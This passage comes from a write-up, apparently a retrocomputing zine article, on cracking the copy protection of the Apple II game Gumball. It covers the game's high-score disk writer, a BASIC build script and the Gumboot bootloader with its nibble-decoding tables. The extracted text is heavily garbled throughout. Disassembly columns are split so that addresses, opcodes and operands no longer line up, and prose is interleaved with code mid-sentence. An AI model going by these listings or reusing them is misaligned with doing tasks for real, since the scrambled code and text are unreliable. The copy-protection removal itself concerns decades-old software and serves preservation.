D0 EF
A8
EA
EA STA
ORA
LDA
BNE
TAY
NOP
NOP BD4E
BD51
BD52
BD53 B9 00 B0
48
4A
09 AA LDA $B000,Y
PHA
LSR
ORA #$AA
A0
8D
8E
8F
8C
FF
C0
C0
C0
C0
#$FF
$C08D,X
$C08E,X
$C08F,X
$C08C,X
$C08D,X
$C08E,X
$C08D,X
$C08C,X
($00,X)
Oh God Oh God Oh God
BD55
BD58
BD5B
BD5D
BD5E
BD5F
BD60
BD61
BD62
BD64
BD67
BD6A
BD6B
BD6C
BD6D
BD6F
BD71
BD73
BD74
BD75
BD78
BD7B
BD7D
BD80
BD83 9D 8D C0
DD 8C C0
C1 00
EA
EA
48
68
68
09 AA
9D 8D C0
DD 8C C0
48
68
C8
D0 DF
A9 D5
C1 00
EA
EA
9D 8D C0
1D 8C C0
A9 08
20 A8 FC
BD 8E C0
BD 8C C0 STA
CMP
CMP
NOP
NOP
PHA
PLA
PLA
ORA
STA
CMP
PHA
PLA
INY
BNE
LDA
CMP
NOP
NOP
STA
ORA
LDA
JSR
LDA
LDA BD86
BD88 A9 07
20 00 BE LDA #$07
JSR $BE00 seek back to track 3.5
BD8B
BD8E BD 88 C0
60 LDA $C088,X
RTS turn off drive motor and exit
gracefully
#$AA
$C08D,X
$C08C,X
$BD4E
#$D5
($00,X)
$C08D,X
$C08C,X
#$08
$FCA8
$C08E,X
$C08C,X
This is a disk write routine. It’s taking the data
at $B000 (that mystery sector that was loaded even
earlier in the boot) and writing it to track 1.
Because high scores.
That’s what’s at $B000. High scores. [Edit from
the future: also some persistent joystick options.]
Why is this so distressing? Because it means
I’ll get to include a full read/write RWTS on my
crack (which I haven’t even starting building yet,
but soon!) so it can save high scores like the original
game. Because anything less is obviously unaccept-
able.
$C08F,X
$C08C,X The Right Ones In The Right Order
($00,X)
($00,X) Let’s step back from the low-level code for a mo-
ment and talk about how this game interacts with
the disk at a high level.
$C08D,X
$C08C,X
$BD8F,Y
$BD3A
• There is no runtime protection check. All the
“protection” is structural—data is stored on
whole tracks, half tracks, and even some con-
secutive quarter tracks. Once the game code
is in memory, there are no nibble checks or
secondary protections.
Oh God
← !
• The game code itself contains no disk code.
They’re completely isolated. I proved this by
loading the game code from my work disk and
46tr
00
01
02
03
04
05
06
07
08
09
0A
0B
0C
0D
0E
0F
10
11
12
13
14
15
16
17
18
19
1A
jumping to the entry point. (I tested the ani-
mated introduction, but you can also run the
game itself by loading the block $01 files into
memory and jumping to $31F9. The game
runs until you finish the level and it tries to
load the first cut scene from disk.)
• The game code communicates with the disk
subsystem through the output vector, i.e.
by printing #$00..#$06 to $FDED. The disk
code handles filling the screen with a pseudo-
random color, reading the right chunks from
the right places on disk and putting them into
the right places in memory, then jumping to
the right address to continue. (In the case of
printing #$04, it handles writing the right data
in memory to the right place on disk.)
• Game code lives at $0800..$AFFF, zero page,
and one page at $B000 for high scores. The
disk subsystem clobbers the text screen at
$0400 using lo-res graphics for the color fills.
All memory above $B100 is available; in fact,
most of it is wiped (at $0300) after every disk
command.
This is great news. It gives us total flexibility to
recreate the game from its constituent pieces.
memory range
$BD00..$BFFF
$B000..$B3FF
$0800..$17FF
$1800..$27FF
$2800..$37FF
$3800..$3FFF
$6000..$67FF
$6800..$77FF
$7000..$87FF
$0800..$17FF
$1800..$27FF
$2800..$37FF
$3800..$3FFF
$6000..$6FFF
$7000..$7FFF
$8000..$8FFF
$9000..$9FFF
$A000..$AFFF
$0800..$17FF
$1800..$27FF
$2800..$37FF
$3800..$3FFF
$6000..$6FFF
$7000..$7FFF
$8000..$87FF
$2000..$2FFF
$3000..$3FFF
notes
Gumboot
scores/zpage/glue
block 0
block 0
block 0
block 0
block 0
block 0
block 0
block 1
block 1
block 1
block 1
block 1
block 1
block 1
block 1
block 1
block 2
block 2
block 2
block 2
block 2
block 2
block 2
block 3
block 3
A Man, A Plan, A Canal, &c.
Here’s the plan:
I wrote a build script to take all the chunks of
game code I captured way back on page 43. And by
“script”, I mean “BASIC program.”
1. Write the game code to a standard 16-sector
disk
]PR#5
...
10 REM MAKE GUMBALL
11 REM S6,D1=BLANK DISK
12 REM S5,D1=WORK DISK
20 D$ = CHR$ (4)
2. Write a bootloader and RWTS that can read
the game code into memory
3. Write some glue code to mimic the origi-
nal output vector at $BF6F (A = command
ID from #$00-#$06, all other values actually
print) so I don’t need to change any game code
30 PRINT D$"BLOAD BLOCK
00.0800-1FFF,
A$1000"
40 PRINT D$"BLOAD BLOCK
00.2000-3FFF,
A$2800"
4. Declare victory 24
50 PAGE = 16:COUNT = 56:TRK = Write it to tracks $02-$05:
2:
SEC = 0: GOSUB 1000
Looking at the length of each block and dividing
by 16, I can space everything out on separate tracks
and still have plenty of room. This means each block
can start on its own track, which saves a few bytes
by being able to hard-code the starting sector for
each block.
The disk map will look like this:
24 take
Load the first part of block 0:
60 PRINT D$"BLOAD BLOCK
00.6000-87FF,
A$6000"
Load the second part of
block 0:
70 PAGE = 96:COUNT = 40:TRK = Write it to tracks $06-$08:
6:
SEC = 0: GOSUB 1000
a nap
4780 PRINT D$"BLOAD BLOCK
And so on, for all the other
01.0800-1FFF,
blocks:
A$1000"
90 PRINT D$"BLOAD BLOCK
01.2000-3FFF,
A$2800"
100 PAGE = 16:COUNT = 56:TRK
= 9:
SEC = 0: GOSUB 1000
110 PRINT D$"BLOAD BLOCK
01.6000-AFFF,
A$6000"
120 PAGE = 96:COUNT = 80:TRK
= 13:
SEC = 0: GOSUB 1000
130 PRINT D$"BLOAD BLOCK
02.0800-1FFF,
A$1000"
140 PRINT D$"BLOAD BLOCK
02.2000-3FFF,
A$2800"
150 PAGE = 16:COUNT = 56:TRK
= 18:
SEC = 0: GOSUB 1000
160 PRINT D$"BLOAD BLOCK
02.6000-87FF,
A$6000"
170 PAGE = 96:COUNT = 40:TRK
= 22:
SEC = 0: GOSUB 1000
180 PRINT D$"BLOAD BLOCK
03.2000-3FFF,
A$2000"
190 PAGE = 32:COUNT = 32:TRK
= 25:
SEC = 0: GOSUB 1000
200 PRINT D$"BLOAD BOOT2
0500-07FF,
A$2500"
210 PAGE = 39:COUNT = 1:TRK =
1:
SEC = 0: GOSUB 1000
220 PRINT D$"BLOAD BOOT3
0000-00FF,
A$1000"
230 POKE 4150,0: POKE
4151,178: REM
SET ($36) TO $B200
240 PAGE = 16:COUNT = 1:TRK =
1:
SEC = 7: GOSUB 1000
999 END
1000 REM WRITE TO DISK
1010 PRINT D$"BLOAD WRITE"
1020 POKE 908,TRK
1030 POKE 909,SEC
1040 POKE 913,PAGE
1050 POKE 769,COUNT
1060 CALL 768
1070 RETURN
]SAVE MAKE
LDA #$D1
STA $FF
0304
0306 A9 00
85 FE LDA #$00
STA $FE
o O
LDA #$03
LDY #$88
JSR $03D9 call RWTS to write sector
030F
0311
0313
0315
0317
0319
031B E6
A4
C0
D0
A0
84
EE 8C INC
LDY
CPY
BNE
LDY
STY
INC increment logical sector, wrap
around from $0F to $00 and
increment track
031E
0321 B9 40 03
8D 8D 03 LDA $0340,Y
STA $038D convert logical to physical
sector
0324 EE 91 03 INC $0391 increment page to write
0327
0329
032B C6 FF
D0 DD
60 DEC $FF
BNE $0308
RTS loop until done with all
sectors
FE
FE
10
07
00
FE
03
$FE
$FE
#$10
$031E
#$00
$FE
$038C
0340 00 07 0E 06 0D 05 0C 04
0348 0B 03 0A 02 09 01 08 0F
*388.397
logical to physical sector
mapping
0388 01 60 01 00 D1 D1 FB F7
track/sector
(set from BASIC)
0390 00 D1 00 00 02 00 00 60
address
(set from BASIC)
RWTS parameter table,
pre-initialized with slot
(#$06), drive (#$01), and
RWTS write command (#$02)
*BSAVE WRITE,A$300,L$98
[S6,D1=blank disk]
]RUN MAKE
. . .write write write. . .
Boom! The entire game is on tracks $02-$1A of
a standard 16-sector disk.
Now we get to write an RWTS.
Introducing Gumboot
Gumboot is a fast bootloader and full read/write
RWTS. It fits in 4 sectors on track 0, including a
boot sector. It uses only 6 pages of memory for all
its code + data + scratch space. It uses no zero page
addresses after boot. It can start the game from a
cold boot in 3 seconds. That’s twice as fast as the
original disk.
]CALL -151
A9 D1
85 FF A9 03
A0 88
20 D9 03
*340.34F
The BASIC program relies on a short assembly
language routine to do the actual writing to disk.
Here is that routine (loaded on line 1010):
0300
0302 0308
030A
030C
page count (set from BASIC)
logical sector (incremented)
48$BB00..$BCFF data tables (initialized once during
boot)
Gumboot Boot0
Gumboot starts, as all disks start, on track $00.
Sector $00 (boot0) reuses the disk controller ROM
routine to read sector $0E, $0D, and $0C (boot1).
Boot0 creates a few data tables, modifies the boot1
code to accommodate booting from any slot, and
jumps to it.
Boot0 is loaded at $0800 by the disk controller
ROM routine.
tell the ROM to load only
this sector (we’ll do the rest
manually)
0800 [01]
qkumba wrote it from scratch, because of course
he did. I, um, mostly just cheered.
After boot-time initialization, Gumboot is dead
simple and always ready to use:
entry
$BD00
$BE00
$BF00
command
read
write
seek
parameters
A = first track
Y = first page
X = sector count
A = sector
Y = page
A = track
That’s it. It’s so small, there’s $80 unused bytes
at $BF80. You could fit a cute message in there!
(We didn’t.)
Some important notes:
• The read routine reads consecutive tracks in
physical sector order into consecutive pages in
memory. There is no translation from physical
to logical sectors.
LSR
4A 0802 69 BC ADC #$BC 0804 85 27 STA $27 store the load address
0806
0807 0A
0A ASL
ASL shift the accumulator again
(now that we’ve stored the
load address)
0808 8A TXA 0809 B0 0D BCS $0818 transfer X (boot slot x16) to
the accumulator, which will
be useful later but doesn’t
affect the carry flag we may
have just tripped with the
two “ASL” instructions
if the two “ASL” instructions
set the carry flag, it means
the load address was at least
#$C0, which means we’ve
loaded all the sectors we
wanted to load and we should
exit this loop
080B E6 3D INC $3D Set up next sector number to
read. The disk controller
ROM does this once already,
but due to quirks of timing,
it’s much faster to increment
it twice so the next sector you
want to load is actually the
next sector under the drive
head. Otherwise you end up
waiting for the disk to spin an
entire revolution, which is
quite slow.
080D
080E
080F
0810
0811 4A
4A
4A
4A
09 C0 LSR
LSR
LSR
LSR
ORA #$C0 Set up the “return” address to
jump to the “read sector”
entry point of the disk
controller ROM. This could
be anywhere in $Cx00
depending on the slot we
booted from, which is why we
put the boot slot in the
accumulator at $0808.
• The write routine writes one sector, and also
assumes a physical sector number.
• The seek routine can seek forward or back to
any whole track. (I mention this because some
fastloaders can only seek forward.)
I said Gumboot takes 6 pages in memory, but I’ve
only mentioned 3. The other 3 are for data:
$BA00..$BB55 scratch space for write (technically
available as long as you don’t mind them being
clobbered during disk write)
49
The accumulator is #$01 after
loading sector $00, #$03 after
loading sector $0E, #$05 after
loading sector $0D, and #$07
after loading sector $0C. We
shift it right to divide by 2,
then use that to calculate the
load address of the next
sector.
Sector $0E → $BD00
Sector $0D → $BE00
Sector $0C → $BF00
0801PHA
LDA #$5B
PHA push the entry point on the
stack
60 RTS “Return” to the entry point
via RTS. The disk controller
ROM always jumps to $0801
(remember, that’s why we
had to move it and patch it to
trace the boot all the way
back on page 25), so this
entire thing is a loop that
only exits via the “BCS”
branch at $0809.
8C
00
08
26
08
0A
27
00
26
E8
E8
D0 EC ORA
LDX
LDY
STY
LDY
BEQ
STY
LDY
STA
INX
INX
BNE 0813
0814
0816 48
A9 5B
48
0817 09
A2
BC AF
84
BC B0
F0
84
A0
91 0830
0832 29 F8
8D FC BD AND #$F8
STA $BDFC munge $EC → $E8 (used later
to turn off the drive motor)
0835
0837
083A 09 01
8D 0B BD
8D 07 BE ORA #$01
STA $BD0B
STA $BE07 munge $E8 → $E9 (used later
to turn on the drive motor)
083D
083F 49 09
8D 54 BF EOR #$09
STA $BF54 munge $E9 → $E0 (used later
to move the drive head via
the stepper motor)
0842
0844
0847
084A
084D 8D
8D
8D
8D AND
STA
STA
STA
STA munge $E0 → $60 (boot slot
x16, used during seek and
write routines)
70
BE
BE
BE
BE
$081C
#$70
$BE37
$BE69
$BE7F
$BEAC
Before I dive into the next chunk of code, I get to
pause and explain a little bit of theory. As you prob-
ably know if you’re the sort of person who’s read this
far already, Apple II floppy disks do not contain the
actual data that ends up being loaded into memory.
Due to hardware limitations of the original Disk II
drive, data on disk is stored in an intermediate for-
mat called “nibbles.” Bytes in memory are encoded
into nibbles before writing to disk, and nibbles that
you read from the disk must be decoded back into
bytes. The round trip is lossless but requires some
bit wrangling.
Decoding nibbles-on-disk into bytes-in-memory
is a multi-step process. In “6-and-2 encoding” (used
by DOS 3.3, ProDOS, and all “.dsk” image files),
there are 64 possible values that you may find in
the data field. (In the range $96..$FF, but not all
of those, because some of them have bit patterns
that trip up the drive firmware.) We’ll call these
“raw nibbles.”
Execution continues here
(from $0809) after three
sectors have been loaded into
memory at $BD00..$BFFF.
There are a number of places
in boot1 that hit a
slot-specific soft switch (read
a nibble from disk, turn off
the drive, &c.). Rather than
the usual form of “LDA
$C08C,X”, we will use “LDA
$C0EC” and modify the $EC
byte in advance, based on the
boot slot. $08A4 is an array of
all the places in the Gumboot
code that get this adjustment.
0818
081A
081C
081F
0821
0824
0826
0828
082A
082C
082D
082E
29
37
69
7F
AC
#$8C
#$00
$08AF,X
$26
$08B0,X
$0830
$27
#$00
($26),Y
6+2
Step 1) read $156 raw nibbles from the data field.
These values will range from $96 to $FF, but as
mentioned earlier, not all values in that range
will appear on disk.
Now we have $156 raw nibbles.
Step 2) decode each of the raw nibbles into a 6-
bit byte between 0 and 63. (%00000000 and
%00111111 in binary.) $96 is the lowest valid
raw nibble, so it gets decoded to 0. $97 is the
next valid raw nibble, so it’s decoded to 1. $98
and $99 are invalid, so we skip them, and $9A
gets decoded to 2. And so on, up to $FF (the
highest valid raw nibble), which gets decoded
to 63.
Now we have $156 6-bit bytes.
Step 3) split up each of the first $56 6-bit bytes into
pairs of bits. In other words, each 6-bit byte
becomes three 2-bit bytes. These 2-bit bytes
are merged with the next $100 6-bit bytes to
create $100 8-bit bytes. Hence the name, “6-
and-2” encoding.
The exact process of how the bits are split and
merged is. . . complicated. The first $56 6-bit bytes
get split up into 2-bit bytes, but those two bits get
swapped such that %01 becomes %10 and vice-versa.
The other $100 6-bit bytes each get multiplied by
4 (a.k.a. bit-shifted two places left). This leaves a
50hole in the lower two bits, which is filled by one of
the 2-bit bytes from the first group.
A diagram might help. “a” through “x” each rep-
resent one bit.
1 decoded
nibble in
first $56
+
00abcdef
=
3
bytes
To make it possible to twiddle the bits and not
miss nibbles as the disk spins 25 , we do some of the
work in advance. We multiply each of the 64 pos-
sible decoded values by 4 and store those values.
(Since this is done by bit shifting and we’re doing
it before we start reading the disk, this is called the
“pre-shift” table.) We also store all possible 2-bit
values in a repeating pattern that will make it easy
to look them up later. Then, as we’re reading from
disk (and timing is tight), we can simulate bit math
with a series of table lookups. There is just enough
time to convert each raw nibble into its final 8-bit
byte before reading the next nibble.
00ghijkl
00mnopqr
00stuvwx
split
&
swapped
000000fe
000000dc
000000ba
3 decoded
nibbles in
other $100
follow. By the time Gumboot gets to the data field
checksum, it has already stored all $100 8-bit bytes
in their final resting place in memory. This means
that we can read all 16 sectors on a track in one
revolution of the disk. That’s what makes it crazy
fast.
shifted
left x2
+
+
+
ghijkl00
mnopqr00
stuvwx00
=
=
=
ghijklfe
mnoprqdc
stuvwxba
Tada! Four 6-bit bytes
The first table, at $BC00..$BCFF, is three
columns wide and 64 rows deep. Astute readers will
notice that 3 x 64 is not 256. Only three of the
columns are used; the fourth (unused) column exists
because multiplying by 3 is hard but multiplying by
4 is easy in base 2. The three columns correspond
to the three pairs of 2-bit values in those first $56
6-bit bytes. Since the values are only 2 bits wide,
each column holds one of four different values. (%00,
%01, %10, or %11.)
00abcdef
00ghijkl
00mnopqr
00stuvwx
become three 8-bit bytes
ghijklfe
mnoprqdc
stuvwxba
When DOS 3.3 reads a sector, it reads the first
$56 raw nibbles, decoded them into 6-bit bytes, and
stashes them in a temporary buffer at $BC00. Then
it reads the other $100 raw nibbles, decodes them
into 6-bit bytes, and puts them in another tempo-
rary buffer at $BB00. Only then does DOS 3.3 start
combining the bits from each group to create the
full 8-bit bytes that will end up in the target page
in memory. This is why DOS 3.3 “misses” sectors
when it’s reading, because it’s busy twiddling bits
while the disk is still spinning.
Gumboot also uses “6-and-2” encoding. The first
$56 nibbles in the data field are still split into pairs
of bits that will be merged with nibbles that won’t
come until later. But instead of waiting for all $156
raw nibbles to be read from disk, it “interleaves”
the nibble reads with the bit twiddling required to
merge the first $56 6-bit bytes and the $100 that
The second table, at $BB96..$BBFF, is the “pre-
shift” table. This contains all the possible 6-bit
bytes, in order, each multiplied by 4. (They are
shifted to the left two places, so the 6 bits that
started in columns 0-5 are now in columns 2-7, and
columns 0 and 1 are zeroes.) Like this:
00ghijkl –> ghijkl00
Astute readers will notice that there are only 64
possible 6-bit bytes, but this second table is larger
than 64 bytes. To make lookups easier, the table
has empty slots for each of the invalid raw nibbles.
In other words, we don’t do any math to decode raw
nibbles into 6-bit bytes; we just look them up in this
table (offset by $96, since that’s the lowest valid raw
nibble) and get the required bit shifting for free.
25 The disk spins independently of the CPU, and we only have a limited time to read a nibble and do what we’re going to do
with it before WHOOPS HERE COMES ANOTHER ONE. So time is of the essence. Also, “As The Disk Spins” would make
a great name for a retrocomputing-themed soap opera.
51addr
$BB96
$BB97
$BB98
$BB99
$BB9A
$BB9B
$BB9C
$BB9D
.
.
.
$BBFE
$BBFF
raw
$96
$97
$98
$99
$9A
$9B
$9C
$9D decoded 6-bit
0 = %00000000
1 = %00000001
[invalid raw
[invalid raw
2 = %00000010
3 = %00000011
[invalid raw
4 = %00000100
$FE
$FF 62 = %00111110
63 = %00111111
pre-shift
%00000000
%00000100
nibble]
nibble]
%00001000
%00001100
nibble]
%00010000
And this is the result, where “..” means that
the address is uninitialized and unused.
BB90
BB98
BBA0
BBA8
BBB0
BBB8
BBC0
BBC8
BBD0
BBD8
BBE0
BBE8
BBF0
BBF8
%11111000
%11111100
087A
087C
087E
0880
0883
0886
0888
088A
088C
088E
088F
0890
0892
0893
0894
0895
0896
0897
0899
089B
089C
089E
Back to Gumboot
This is the loop that creates the pre-shift table at
$BB96. As a special bonus, it also creates the inverse
table that is used during disk write operations, con-
verting in the other direction.
A2 3F
86 FF
E8
A0 7F
84 FE
98
0A
24 FE
F0 18
05 FE
49 FF
29 7E
B0 10
4A
D0 FB
CA
8A
0A
0A
99 80 BB
98
09 80
9D 56 BB
88
D0 DD
LDX
STX
INX
LDY
STY
TYA
ASL
BIT
BEQ
ORA
EOR
AND
BCS
LSR
BNE
DEX
TXA
ASL
ASL
STA
TYA
ORA
STA
DEY
BNE
..
..
..
..
50
..
..
..
88
..
B0
..
E4
08
..
..
38
54
..
..
..
8C
..
B4
CC
E8
0C
..
24
3C
58
..
6C
7C
90
..
B8
D0
EC
..
..
28
40
5C
..
..
..
94
..
BC
D4
F0
10
..
2C
44
60
..
70
..
98
A4
C0
D8
F4
00
14
1C
30
48
64
..
74
80
9C
A8
C4
DC
F8
04
18
20
34
4C
68
..
78
84
A0
AC
C8
E0
FC
Next up: a loop to create the table of 2-bit values
at $BC00, magically arranged to enable easy lookups
later.
Each value in this “pre-shift” table also serves as
an index into the first table with all the 2-bit bytes.
This wasn’t an accident; I mean, that sort of magic
doesn’t just happen. But the table of 2-bit bytes is
arranged in such a way that we can take one of the
raw nibbles to be decoded and split apart (from the
first $56 raw nibbles in the data field), use each raw
nibble as an index into the pre-shift table, then use
that pre-shifted value as an index into the first table
to get the 2-bit value we need.
0850
0852
0854
0855
0857
0859
085A
085B
085D
085F
0861
0863
0865
0867
0868
086A
086B
086C
086D
086E
0871
0872
0874
0877
0878
..
..
..
..
..
..
..
..
..
..
..
..
..
#$3F
$FF
#$7F
$FE
$FE
$0877
$FE
#$FF
#$7E
$0877
$0865
$BB80,Y
#$80
$BB56,X
$0857
52
84
46
46
BD BD
99 00
E6
A5
25
D0
29
C0
B0
C0
90
FD
FF
FF
08
BC
FD
FD
FF
05
E8
8A
03
AA
C8
C8
C8
C8
03
E5
C8
03
DC
STY
LSR
LSR
LDA
STA
INC
LDA
AND
BNE
INX
TXA
AND
TAX
INY
INY
INY
INY
CPY
BCS
INY
CPY
BCC
$FD
$FF
$FF
$08BD,X
$BC00,Y
$FD
$FD
$FF
$0893
#$03
#$03
$0880
#$03
$087CAnd this is the result:
BC00
BC08
BC10
BC18
BC20
BC28
BC30
BC38
BC40
BC48
BC50
BC58
BC60
BC68
BC70
BC78
BC80
BC88
BC90
BC98
BCA0
BCA8
BCB0
BCB8
BCC0
BCC8
BCD0
BCD8
BCE0
BCE8
BCF0
BCF8
00
00
00
00
00
00
00
00
02
02
02
02
02
02
02
02
01
01
01
01
01
01
01
01
03
03
03
03
03
03
03
03
00
00
02
02
01
01
03
03
00
00
02
02
01
01
03
03
00
00
02
02
01
01
03
03
00
00
02
02
01
01
03
03
00
01
00
01
00
01
00
01
00
01
00
01
00
01
00
01
00
01
00
01
00
01
00
01
00
01
00
01
00
01
00
01
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
00
00
00
00
00
00
00
00
02
02
02
02
02
02
02
02
01
01
01
01
01
01
01
01
03
03
03
03
03
03
03
03
00
00
02
02
01
01
03
03
00
00
02
02
01
01
03
03
00
00
02
02
01
01
03
03
00
00
02
02
01
01
03
03
02
03
02
03
02
03
02
03
02
03
02
03
02
03
02
03
02
03
02
03
02
03
02
03
02
03
02
03
02
03
02
03
raw nibble value in whichever one is convenient at
the time. (We take full advantage of this freedom.)
I’ve marked each pre-set softswitch with .
There are several other instances of addresses
and constants that get modified while Gumboot is
executing. I’ve left these with a bogus value $D1 and
marked them with .
Gumboot’s source code should be available from
the same place you found this write-up. If you’re
looking to modify this code for your own purposes,
I suggest you “use the source, Luke.”
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
..
o O
o O
And with that, Gumboot is fully armed and op-
erational.
*BD00L
BD00
0A
BD01 8D 10 BF ASL
STA $BF10 A = the track number to seek
to. We multiply it by 2 to
convert it to a phase, then
store it inside the seek routine
which we will call shortly.
BD04 8E EF BD STX $BDEF X = the number of sectors to
read
BD07 8C 24 BD STY $BD24 Y = the starting address in
memory
BD0A AD E9 C0 LDA $C0E9 BD0D 20 75 BF JSR $BF75 poll for real nibbles (#$FF
followed by non-#$FF) as a
way to ensure the drive has
spun up fully
BD10
BD12 A9 10
CD EF BD LDA #$10
CMP $BDEF are we reading this entire
track?
o O
turn on the drive motor
08A0
08A2
08A3
08A5 A9 B2
48
A9 F0
48 LDA #$B2
PHA
LDA #$F0
PHA Push a "return" address on
the stack. We’ll come back to
this later. (Ha ha, get it,
come back to it? OK, let’s
pretend that never happened.) BD15 B0 01 BCS $BD18 yes -> branch
BD17
BD18 AA
8E 94 BF TAX
STX $BF94 no
08A6
08A8
08AA A9 01
A2 03
A0 B0 LDA #$01
LDX #$03
LDY #$B0 Set up an initial read of 3
sectors from track 1 into
$B000..$B2FF. This contains
the high scores data, zero
page, and a new output vector
that interfaces with Gumboot.
Read all that from disk and
exit via the “return” address
we just pushed on the stack
at $0895. BD1B 20 04 BF JSR $BF04 seek to the track we want
BD1E
BD21
BD23
BD25
BD28
BD2B
BD2C
BD2D AE 94
A0
A9
99 84
EE 24 LDX
LDY
LDA
STA
INC
INY
DEX
BNE BD2F 20 D5 BE Initialize an array of which
sectors we’ve read from the
current track. The array is in
physical sector order, thus the
RWTS assumes data is stored
in physical sector order on
each track. (This saves 18
bytes: 16 for the table and 2
for the lookup command!)
Values are the actual pages in
memory where that sector
should go, and they get
zeroed once the sector is read
(so we don’t waste time
decoding the same sector
twice).
08AC
4C 00 BD
JMP $BD00
Execution will continue at $B2F1, once we read
that from disk. $B2F1 is new code I wrote, and I
promise to show it to you. But first, I get to finish
showing you how the disk read routine works.
BF
00
D1
BF
BD
C8
CA
D0 F4
$BF94
#$00
#$D1
$BF84,Y
$BD24
o O
$BD23
JSR $BED5
*BED5L
BED5
BED8
BEDA
BEDC
BEDF
BEE1
BEE3
BEE4
BEE7
BEE9
Read & Go Seek
In a standard DOS 3.3 RWTS, the softswitch to
read the data latch is “LDA $C08C,X”, where X is
the boot slot times 16, to allow disks to boot from
any slot. Gumboot also supports booting and read-
ing from any slot, but instead of using an index,
most fetch instructions are set up in advance based
on the boot slot. Not only does this free up the X
register, it lets us juggle all the registers and put the
20 E4
C9
D0
20 E4
C9
D0
BE
D5
F9
BE
AA
F5
A8
AD EC C0
10 FB
60
JSR
CMP
BNE
JSR
CMP
BNE
TAY
LDA
BPL
RTS
$BEE4
#$D5
$BED5
$BEE4
#$AA
$BED8
$C0EC
$BEE4
o O
This routine reads nibbles
from disk until it finds the
sequence “D5 AA”, then it
reads one more nibble and
returns it in the accumulator.
We reuse this routine to find
both the address and data
field prologues.
Continuing from $BD32. . .
53BD32
BD34 49 AD
F0 35 EOR #$AD
BEQ $BD6B
BD36 20 C2 BE JSR $BEC2
*BEC2L
BEC2
BEC4
BEC7
BEC8
BECB
BECE
BED1
BED2
A0 03
20 E4 BE
2A
8D E0 BD
20 E4 BE
2D E0 BD
88
D0 F0
BED4
60
LDY
JSR
ROL
STA
JSR
AND
DEY
BNE
#$03
$BEE4
$BDE0
$BEE4
$BDE0
$BEC4
If that third nibble is not
#$AD, we assume it’s the end
of the address prologue.
(#$96 would be the third
nibble of a standard address
prologue, but we don’t
actually check.) We fall
through and start decoding
the 4-4 encoded values in the
address field.
BD6D
F0 C0
If X is still #$00, it means we
found a data prologue before
we found an address prologue.
In that case, we have to skip
this sector, because we don’t
know which sector it is and
we wouldn’t know where to
put it. Sad!
BEQ $BD2F
Nibble loop #1 reads nibbles $00..$55, looks
up the corresponding offset in the preshift table at
$BB96, and stores that offset in the temporary two-
byte buffer after the target page.
This routine parses the
4-4-encoded values in the
address field. The first time
through this loop, we’ll read
the disk volume number. The
second time, we’ll read the
track number. The third
time, we’ll read the physical
sector number. We don’t
actually care about the disk
volume or the track number,
and once we get the sector
number, we don’t verify the
address field checksum.
initialize rolling checksum to
#$00, or update it with the
results from the calculations
below
BD6F 8D 7E BD STA $BD7E
BD72
BD75 AE EC C0
10 FB LDX $C0EC
BPL $BD72
BD77 BD 00 BB LDA $BB00,X
BD7A 99 02 D1 STA $D102,Y
o O
On exit, the accumulator
contains the physical sector
number.
RTS
Continuing from $BD39. . .
o O
BD39 A8
BD3A BE 84 BF
BD3D F0 F0
TAY use physical sector number as
an index into the sector
address array
LDX $BF84,Y get the target page (where we
want to store this sector in
memory)
BEQ $BD2F if the target page is #$00, it
means we’ve already read this
sector, so loop back to find
the next address prologue
BD3F 8D E0 BD STA $BDE0 store the physical sector
number later in this routine
BD42
BD45
BD48
BD4B
BD4E
BD51
BD54
BD55
BD58
BD59
BD5A
BD5D 8E
8E
8E
8E
8E
8E BD
BD
BD
BD
BD
BD
E8
8E D9 BD
CA
CA
8E 94 BD
8E AC BD STX
STX
STX
STX
STX
STX
INX
STX
DEX
DEX
STX
STX store the target page in
several places throughout this
routine
BD60
BD62
BD65
BD66
BD67 A0 FE
B9 02 D1
48
C8
D0 F9 LDY #$FE
LDA $D102,Y
PHA
INY
BNE $BD62 Save the two bytes
immediately after the target
page, because we’re going to
use them for temporary
storage. (We’ll restore them
later.)
BD69 B0 C4 BCS $BD2F this is an unconditional
branch
BD6B E0 00 CPX #$00 execution continues here
(from $BD34) after matching
the data prologue
64
C4
7C
8E
A6
BE
$BD64
$BDC4
$BD7C
$BD8E
$BDA6
$BDBE
BD7D 49 D1 EOR #$D1
BD7F
BD80 C8
D0 ED INY
BNE $BD6F
o O
read one nibble from disk
The nibble value is in the X
register now. The lowest
possible nibble value is $96
and the highest is $FF. To
look up the offset in the table
at $BB96, we index off $BB00 +
X. Math!
Now the accumulator has the
offset into the table of
individual 2-bit combinations
($BC00..$BCFF). Store that
offset in a temporary buffer
towards the end of the target
page. (It will eventually get
overwritten by full 8-bit
bytes, but in the meantime
it’s a useful $56-byte scratch
space.)
The EOR value is set at $BD6F
each time through loop #1.
The Y register started at #$AA
(set by the “TAY” instruction
at $BD39), so this loop reads a
total of #$56 nibbles.
Here endeth nibble loop #1.
Nibble loop #2 reads nibbles $56..$AB, com-
bines them with bits 0-1 of the appropriate nib-
ble from the first $56, and stores them in bytes
$00..$55 of the target page in memory.
$BDD9
BD82
BD84
BD87
BD89
BD8C
$BD94
$BDAC
A0
AE EC
10
5D 00
BE 02
AA
C0
FB
BB
D1
LDY
LDX
BPL
EOR
LDX
#$AA
$C0EC
$BD84
$BB00,X
$D102,Y
o O
o O
BD8F 5D 02 BC EOR $BC02,X
BD92 99 56 D1 STA $D156,Y
o O
BD95
BD96
C8
D0 EC
INY
BNE $BD84
This address was set at $BD5A
based on the target page
(minus 1 so we can add Y
from #$AA..#$FF).
Here endeth nibble loop #2.
Nibble loop #3 reads nibbles $AC..$101, com-
bines them with bits 2-3 of the appropriate nib-
54ble from the first $56, and stores them in bytes
$56..$AB of the target page in memory.
BD98
BD9A
BD9C
BD9F
BDA1
BDA4
29
A0
AE EC
10
5D 00
BE 02
FC
AA
C0
FB
BB
D1
AND
LDY
LDX
BPL
EOR
LDX
#$FC
#$AA
$C0EC
$BD9C
$BB00,X
$D102,Y
o O
BDE5
BDE8
BDEB CE EF BD
CE 94 BF
38 DEC $BDEF
DEC $BF94
SEC decrement sector count
BDEC D0 EF BNE $BDDD If the sectors-left-in-this-track
count (in $BF94) isn’t zero
yet, loop back to read more
sectors.
BDEE
BDF0 A2 D1
F0 09 LDX #$D1
BEQ $BDFB BDF2
BDF5 EE 10 BF
EE 10 BF INC $BF10
INC $BF10 increment phase (twice, so it
points to the next whole
block)
BDF8 4C 10 BD JMP $BD10 jump back to seek and read
from the next track
